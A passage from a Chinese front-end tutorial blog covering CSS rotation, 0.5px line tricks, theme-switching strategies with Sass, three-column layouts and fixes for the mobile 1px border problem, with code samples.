.shanxing1 .sx1&#123;transform: rotate(-30deg);&#125;</span><br><span class="line">      .shanxing1 .sx2&#123;transform: rotate(-150deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个85度扇形*/</span><br><span class="line">      .shanxing2 .sx1&#123;transform: rotate(-45deg);&#125;</span><br><span class="line">      .shanxing2 .sx2&#123;transform: rotate(-140deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个向右扇形，90度扇形*/</span><br><span class="line">      .shanxing3 .sx1&#123;transform: rotate(45deg);&#125;</span><br><span class="line">      .shanxing3 .sx2&#123;transform: rotate(-45deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个颜色扇形 */</span><br><span class="line">      .shanxing4 .sx1&#123;transform: rotate(45deg);background-color: #fff;&#125;</span><br><span class="line">      .shanxing4 .sx2&#123;transform: rotate(-45deg);background-color: #fff;&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个不同颜色半圆夹角 */</span><br><span class="line">      .shanxing5 .sx1&#123;transform: rotate(45deg);background-color: #f00;&#125;</span><br><span class="line">      .shanxing5 .sx2&#123;transform: rotate(-45deg);background-color: #0f0;</span><br><span class="line">    &lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="旋转45度"><a href="#旋转45度" class="headerlink" title="旋转45度"></a>旋转45度</h1><p><strong>CSS中使用rotate方法来实现对元素的旋转，在参数中加入角度值，旋转方式为顺时针旋转。</strong></p><p><img src="http://files.shanqianche.cn/20228/1659669277112.png" alt="旋转"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Transform旋转&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      div &#123;</span><br><span class="line">        width: 300px;</span><br><span class="line">        margin: 150px auto;</span><br><span class="line">        background-color: yellow;</span><br><span class="line">        text-align: center;</span><br><span class="line">        -webkit-transform: rotate(45deg); /* for Chrome || Safari */</span><br><span class="line">        -moz-transform: rotate(45deg); /* for Firefox */</span><br><span class="line">        -ms-transform: rotate(45deg); /* for IE */</span><br><span class="line">        -o-transform: rotate(45deg); /* for Opera */</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div&gt;黄色div&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="画-0-5px-的直线"><a href="#画-0-5px-的直线" class="headerlink" title="画 0.5px 的直线"></a>画 0.5px 的直线</h1><h2 id="使用scale缩放"><a href="#使用scale缩放" class="headerlink" title="使用scale缩放"></a>使用scale缩放</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.scale-half &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    transform: scaleY(0.5);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">    &lt;p&gt;1px + scaleY(0.5)&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;hr scale-half&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659669346282.png" alt="效果"><br><strong>Chrome/Safari都变虚了，只有Firefox比较完美看起来是实的而且还很细，效果和直接设置0.5px一样。</strong> 所以通过transform: scale会导致Chrome变虚了，而粗细几乎没有变化。但是如果加上transform-origin: 50% 100%：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.hr.scale-half &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    transform: scaleY(0.5);</span><br><span class="line">    transform-origin: 50% 100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chrome现在的效果如下</p><p><img src="http://files.shanqianche.cn/20228/1659669651765.png" alt="chrome"></p><h2 id="线性渐变linear-gradient"><a href="#线性渐变linear-gradient" class="headerlink" title="线性渐变linear-gradient"></a>线性渐变linear-gradient</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.gradient &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    background: linear-gradient(0deg, #fff, #000);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;linear-gradient(0deg, #fff, #000)&lt;/p&gt;</span><br><span class="line">&lt;div class=&quot;hr gradient&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659669787124.png" alt="效果"></p><p>inear-gradient(0deg, #fff, #000)的意思是：<font color="#FF00FF">渐变的角度从下往上</font>，<font color="#FF00FF">从白色#fff渐变到黑色#000，而且是线性的，在高清屏上，1px的逻辑像素代表的物理（设备）像素有2px，由于是线性渐变，所以第1个px只能是#fff，而剩下的那个像素只能是#000，这样就达到了画一半的目的。</font></p><h2 id="boxshadow"><a href="#boxshadow" class="headerlink" title="boxshadow"></a>boxshadow</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.boxshadow &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    background: none;</span><br><span class="line">    box-shadow: 0 0.5px 0 #000;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;box-shadow: 0 0.5px 0 #000&lt;/p&gt;</span><br><span class="line">&lt;div class=&quot;hr boxshadow&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="viewport"><a href="#viewport" class="headerlink" title="viewport"></a>viewport</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-sacle=0.5&quot;&gt;</span><br></pre></td></tr></table></figure><p>其中width=device-width<strong>表示将viewport视窗的宽度调整为设备的宽度，</strong> 这个宽度通常是指物理上宽度。默认的缩放比例为1时，如iphone 6竖屏的宽度为750px，它的dpr=2，用2px表示1px，这样设置之后viewport的宽度就变成375px。但是我们可以改成0.5，viewport的宽度就是原本的750px，所以1个px还是1px，正常画就行，但这样也意味着UI需要按2倍图的出，整体面面的单位都会放大一倍。</p><h1 id="css-切换主题"><a href="#css-切换主题" class="headerlink" title="css 切换主题"></a>css 切换主题</h1><h2 id="主题层"><a href="#主题层" class="headerlink" title="主题层"></a>主题层</h2><p>这应该是实现主题功能的一种最常用的手段了。首先，我们的站点会有一个最初的基础样式（或者叫默认样式）；然后通过添加一些后续的额外的CSS来覆盖与重新定义部分样式。</p><p><strong>具体实现</strong><br>首先，我们引入基础的样式components.*文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line">@import &quot;components.buttons&quot;</span><br></pre></td></tr></table></figure><p>其中components.tabs文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    background-color: gray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，假设我们的*<em>某个主题的样式文件存放于theme.<em>文件：</em></em><br>对应于components.tabs，theme.tabs文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    background-color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们只需要引入主题样式文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line">@import &quot;components.buttons&quot;</span><br><span class="line"></span><br><span class="line">@import &quot;theme.tabs&quot;;</span><br></pre></td></tr></table></figure><p>这样当前的样式就变为了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    /* background-color: gray; */</span><br><span class="line">    background-color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>实现方式简单<br>可以实现将主题应用与所有元素<br><strong>缺点</strong><br>过多的冗余代码<br>许多的CSS其实是无用的，浪费了带宽<br>把样式文件切分到许多文件中，更加琐碎</p><h2 id="有状态的主题"><a href="#有状态的主题" class="headerlink" title="有状态的主题"></a>有状态的主题</h2><blockquote><p>该方式可以实现基于条件选择不同的主题皮肤，并允许用户在客户端随时切换主题。非常适合需要客户端样式切换功能，或者需要对站点某一部分（区域）进行独立样式设置的场景。</p></blockquote><p><strong>具体实现</strong><br>还是类似上一节中 Tab 的这个例子，我们可以将 Tab 部分的 (S)CSS 改为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    background-color: gray;</span><br><span class="line"></span><br><span class="line">    .t-red &amp; &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .t-blue &amp; &#123;</span><br><span class="line">        background-color: blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们<font color="#FF00FF">把.t-red与.t-blue称为 Tab 元素的上下文环境（context）。Tab 元素会根据 context 的不同展示出不同的样式。</font><br>最后我们给body元素加上这个开关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body class=&quot;t-red&quot;&gt;</span><br><span class="line">    &lt;ul class=&quot;tabs&quot;&gt;...&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>此时 Tab 的颜色为红色。</p><p>当我们将t-red改为t-blue时，Tab 就变为了蓝色主题。</p><p>进一步的，<font color="#FF00FF">我们可以创建一些 (S)CSS 的 util class（工具类）来专门控制一些 CSS 属性</font>，帮助我们更好地控制主题。例如我们使用如下的.u-color-current类来控制不同主题下的字体颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.u-color-current &#123;</span><br><span class="line">    .t-red &amp; &#123;</span><br><span class="line">        color: red;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .t-blue &amp; &#123;</span><br><span class="line">        color: blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，当我们在不同主题上下文环境下使用.u-color-current时，就<font color="#FF00FF">可以控制元素展示出不同主题的字体</font>颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body class=&quot;t-red&quot;&gt;</span><br><span class="line">    &lt;h1 class=&quot;page-title u-color-current&quot;&gt;...&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>将许多主题放在了同一处代码中<br>非常适合主题切换的功能<br>非常适合站点局部的主题化<br>可以实现将主题应用于所有元素<br><strong>缺点</strong><br>有时有点也是缺点，将许多主题混杂在了同一块代码中<br>可能会存在冗余</p><h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>这种方式其实是在开发侧来实现主题样式的区分与切换的。基于不同的配置，配合一些开发的自动化工具，我们可以在开发时期根据配置文件，编译生成不同主题的 CSS 文件。</p><p>它一般会结合使用一些 CSS 预处理器，可以对不同的 UI 元素进行主题分离，并且向客户端直接提供主题样式下最终的 CSS。</p><p><strong>具体实现</strong><br>我们还是以 Sass 为例：<br>首先会有一份 Sass 的配置文件，例如settings.config.scss，在这份配置中定义当前的主题值以及一些其他变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$theme: red;</span><br></pre></td></tr></table></figure><p>然后对于一个 Tab 组件，我们这么来写它的 Sass 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line"></span><br><span class="line">    @if ($theme == red) &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125; @else &#123;</span><br><span class="line">        background-color: gray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，我们在其之前引入相应的配置文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;settings.config&quot;;</span><br><span class="line">@import &quot;components.tabs&quot;;</span><br></pre></td></tr></table></figure><p>Tab 组件就会呈现出红色主题。</p><p>当然，我们也可以把我们的settings.config.scss做的更健壮与易扩展一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$config: (</span><br><span class="line">    theme: red,</span><br><span class="line">    env: dev,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 从$config中获取相应的配置变量</span><br><span class="line">@function config($key) &#123;</span><br><span class="line">    @return map-get($config, $key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前相比，这时候使用起来只需要进行一些小的修改，将直接使用theme变量改为调用config方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tab &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line"></span><br><span class="line">    @if (config(theme) == red) &#123;</span><br><span class="line">        background-color: red;</span><br><span class="line">    &#125; @else &#123;</span><br><span class="line">        background-color: gray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点</strong><br>访问网站时，只会传输所需的 CSS，节省带宽<br>将主题的控制位置放在了一个地方（例如上例中的settings.config.scss文件）<br>可以实现将主题应用于所有元素<br><strong>缺点</strong><br>在 Sass 中会有非常多逻辑代码<br>只支持有限数量的主题<br>主题相关的信息会遍布代码库中<br>添加一个新主题会非常费劲</p><h2 id="主题调色板"><a href="#主题调色板" class="headerlink" title="主题调色板"></a>主题调色板</h2><p>这种方式有些类似于我们绘图时，预设了一个调色板（palette），然后使用的颜色都从其中取出一样。<br>在实现主题功能时，我们也会有一个类似的“调色板”，其中定义了主题所需要的各种属性值，之后再将这些信息注入到项目中。<br>当你经常需要为客户端提供完全的定制化主题，并且经常希望更新或添加主题时，这种模式会是一个不错的选择。</p><p><strong>具体实现</strong></p><p>在方式三中，我们在一个独立的配置文件中设置了一些“环境”变量，来标示当前所处的主题。而在方式四中，我们会更进一步，抽取出一个专门的 palette 文件，用于存放不同主题的变量信息。</p><p>例如，现在我们有一个settings.palette.red.scss文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$color: red;</span><br><span class="line">$color-tabs-background: $color-red;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们的components.tabs.scss文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.tabs &#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    backgroung-color: $color-tabs-background;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候，我们只需要引入这两个文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;settings.palette.red&quot;;</span><br><span class="line">@import &quot;components.tabs&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，components.tabs.scss中并没有关于主题的逻辑判断，我们只需要专注于编辑样式，剩下就是选择所需的主题调色板（palette）即可。</p><p><strong>优点</strong><br>编译出来的样式代码无冗余<br>非常适合做一些定制化主题，例如一个公司采购了你们的系统，你可以很方便实现一个该公司的主题<br>可以从一个文件中完全重制出你需要的主题样式<br><strong>缺点</strong><br>由于主要通过设定不同变量，所以代码确定后，能实现的修改范围会是有限的</p><h2 id="用户定制化"><a href="#用户定制化" class="headerlink" title="用户定制化"></a>用户定制化</h2><p>这种模式一般会提供一个个性化配置与管理界面，让用户能自己定义页面的展示样式。<br>“用户定制化”在社交媒体产品、SaaS 平台或者是 Brandable Software 中最为常见。<br><strong>具体实现</strong><br>要实现定制化，可以结合方式二中提到的 util class。<br>首先，页面中支持自定义的元素会被预先添加 util class，例如 Tab 元素中的u-user-color-background</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul class=&quot;tabs u-user-color-background&quot;&gt;...&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>此时，u-user-color-background还并未定义任何样式。而当用户输入了一个背景色时，我们会创建一个标签，并将 hex 值注入其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style id=&quot;my-custom&quot;&gt;</span><br><span class="line">    .u-user-color-background &#123;</span><br><span class="line">        background-color: #00ffff;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>这时用户就得到了一个红色的 Tab。</p><p><strong>优点</strong><br>不需要开发人员的输入信息（是用户定义的）<br>允许用户拥有自己“独一无二”的站点<br>非常实用<br><strong>缺点</strong><br>不需要开发人员的输入信息也意味着你需要处理更多的“不可控”情况<br>会有许多的冗余<br>会浪费 CSS 的带宽<br>失去部分 CSS 的浏览器缓存能力</p><h1 id="布局-三栏布局-平均分布"><a href="#布局-三栏布局-平均分布" class="headerlink" title="布局: 三栏布局(平均分布)"></a>布局: 三栏布局(平均分布)</h1><ol><li>flex: 设置父级弹性盒，子盒子三个各占1份</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line">   &lt;div class=&quot;Grid-cell&quot;&gt;1/3&lt;/div&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.Grid &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.Grid-cell &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  background: #eee;</span><br><span class="line">  margin: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>flex 百分比</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell clo3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>流式布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;Grid&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell col3&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;Grid-cell clo3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">.col3 &#123;</span><br><span class="line">  width: 33.33%</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="移动端-1px-问题"><a href="#移动端-1px-问题" class="headerlink" title="移动端 1px 问题"></a>移动端 1px 问题</h1><p><strong>问题：</strong> 1px 的边框，在高清屏下，移动端的1px 会很粗</p><p><strong>产生原因</strong><br>那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.devicePixelRatio=物理像素 /CSS像素</span><br></pre></td></tr></table></figure><p>目前主流的屏幕DPR=2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR=2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。<br><strong>解决方案</strong></p><ol><li>WWDC对iOS统给出的方案</li></ol><p>在 WWDC大会上，给出来了1px方案，<strong>当写 0.5px的时候，就会显示一个物理像素宽度的 border，</strong> 而不是一个css像素的 border。 所以在iOS下，你可以这样写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border:0.5px solid #E5E5E5</span><br></pre></td></tr></table></figure><p>可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。<br><strong>总结：</strong><br>优点：简单，没有副作用<br>缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。</p><ol start="2"><li>使用边框图片</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">border: 1px solid transparent;</span><br><span class="line">border-image: url(&#x27;./../../image/96.jpg&#x27;) 2 repeat;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong><br>优点：没有副作用<br>缺点：border颜色变了就得重新制作图片；圆角会比较模糊。</p><ol start="3"><li>使用box-shadow实现</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">box-shadow: 0  -1px 1px -1px #e5e5e5,   //上边线</span><br><span class="line">            1px  0  1px -1px #e5e5e5,   //右边线</span><br><span class="line">            0  1px  1px -1px #e5e5e5,   //下边线</span><br><span class="line">            -1px 0  1px -1px #e5e5e5;   //左边线</span><br></pre></td></tr></table></figure><p><strong>总结</strong><br>优点：使用简单，圆角也可以实现<br>缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。</p><ol start="4"><li><p>使用伪元素</p><ul><li><p>1条border</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.setOnePx&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  &amp;::after&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    background-color: #e5e5e5;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 1px; /*no*/</span><br><span class="line">    transform: scale(1, 0.5);</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小0.5倍。</p><ul><li>4条border<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.setBorderAll&#123;</span><br><span class="line">     position: relative;</span><br><span class="line">       &amp;:after&#123;</span><br><span class="line">           content:&quot; &quot;;</span><br><span class="line">           position:absolute;</span><br><span class="line">           top: 0;</span><br><span class="line">           left: 0;</span><br><span class="line">           width: 200%;</span><br><span class="line">           height: 200%;</span><br><span class="line">           transform: scale(0.5);</span><br><span class="line">           transform-origin: left top;</span><br><span class="line">           box-sizing: border-box;</span><br><span class="line">           border: 1px solid #E5E5E5;</span><br><span class="line">           border-radius: 4px;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的0.5倍</li></ul></li></ul></li></ol><p><strong>总结：</strong><br><font color="#FF00FF">优点：全机型兼容，实现了真正的1px，而且可以圆角。</font><br>缺点：暂用了after 伪元素，可能影响清除浮动。</p><ol start="5"><li>设置viewport的scale值</li></ol><p>这个解决方案是利用<strong>viewport+rem+js</strong> 实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 